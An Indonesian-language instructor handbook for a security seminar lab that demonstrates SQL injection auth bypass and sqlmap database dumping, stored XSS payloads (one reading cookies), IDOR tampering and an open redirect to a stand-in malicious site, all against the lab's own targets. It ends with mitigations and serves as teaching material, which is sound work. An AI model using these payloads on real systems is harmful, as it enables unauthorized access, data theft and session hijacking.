# 🛡️ ACT LAB :: INSTRUCTOR HANDBOOK (NATIONAL SEMINAR EDITION)

Selamat datang di modul panduan instruktur. Dokumen ini dirancang untuk membantu penyampaian materi eksploitasi secara live. Fokus kita adalah pada metodologi **Manual** dan **Automated** menggunakan tools standar industri.

---

## 1. SQL INJECTION (SQLi) - AUTH BYPASS
**Target:** Login Page (`/lab/sqli-login`)

### Metodologi Manual (Tutor Style)
*   **Analisis Awal:** Masukkan karakter `'` (single quote) pada kolom password. Jelaskan ke audiens bahwa error atau respon aneh menunjukkan input tidak di-sanitasi.
*   **Payload Universal:** 
    *   `admin' --` (Bypass username)
    *   `' OR '1'='1' --` (Bypass password logic)
    *   `") OR ("1"="1" --` (Payload nyeleneh untuk bypass filter kurung)
*   **Burp Suite Step:** 
    1. Intercept request POST ke `/api/auth/login`.
    2. Kirim ke **Intruder**.
    3. Gunakan wordlist `SQLi - Auth Bypass` untuk menunjukkan betapa cepatnya bypass ini dilakukan.

---

## 2. SQL INJECTION (SQLi) - UNION BASED
**Target:** Search Field (`/lab/sqli-union`)

### Eksploitasi Automated (SQLmap)
Sampaikan bahwa dalam audit nyata, kita menggunakan otomasi untuk menghemat waktu.
*   **Command:** 
    ```bash
    sqlmap -u "http://act-lab.app/api/search?q=test" --batch --dbs
    ```
*   **Dumping Data:**
    ```bash
    sqlmap -u "http://act-lab.app/api/search?q=test" -D actlab -T challenges --dump
    ```
*   **Point Utama:** Jelaskan bagaimana SQLmap mendeteksi jumlah kolom secara otomatis menggunakan teknik UNION.

---

## 3. XSS (CROSS-SITE SCRIPTING) - STORED
**Target:** Guestbook (`/lab/xss-stored`)

### Metodologi Phishing & Cookie Stealing
*   **Payload Nyeleneh:** 
    *   `<img src=x onerror=alert(1)>` (Klasik)
    *   `<svg/onload=alert('ACT_PWNED')>` (Bypass filter tag script)
    *   `<details open ontoggle=alert(document.cookie)>` (Payload modern)
*   **Demonstrasi:** Jelaskan bahwa payload ini tersimpan di database. Setiap kali user lain (atau admin) membuka halaman ini, script kita akan tereksekusi di browser mereka.

---

## 4. IDOR (INSECURE DIRECT OBJECT REFERENCE)
**Target:** Profile Viewer (`/lab/idor`)

### Manipulasi Parameter (Burp Suite)
*   **Skenario:** Peserta melihat profil mereka sendiri (`id=999`).
*   **Eksploitasi:** 
    1. Gunakan Burp **Repeater**.
    2. Ubah `id=999` menjadi `id=1` atau `id=2`.
    3. Tunjukkan bahwa kita bisa melihat data sensitif user lain tanpa izin.
*   **Analisis:** Jelaskan pentingnya Access Control List (ACL) di sisi server.

---

## 5. OPEN REDIRECT
**Target:** Navigation Gateway (`/lab/redirect`)

### Phishing Simulation
*   **Payload:** `?url=https://evil-site.com`
*   **Metode:** Tunjukkan bagaimana URL yang terlihat "aman" (berawalan domain kita) bisa menjerumuskan user ke situs berbahaya.

---

## 🛰️ TIPS SEMINAR
1.  **Gunakan Burp Suite** di layar proyektor. Audiens sangat suka melihat *Raw HTTP Request*.
2.  **Payload Nyeleneh:** Tantang peserta untuk mencoba payload dari [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings). Sistem kita sudah didesain universal untuk menerima variasi input selama logika SQL/HTML-nya benar.
3.  **Kesimpulan:** Selalu tutup setiap sesi dengan **Mitigasi**. Jangan hanya ajarkan cara merusak, tapi cara memperbaiki (Parameterized Queries, Input Validation, CSP).

**ACT LAB :: EMPOWERING CYBER SECURITY**
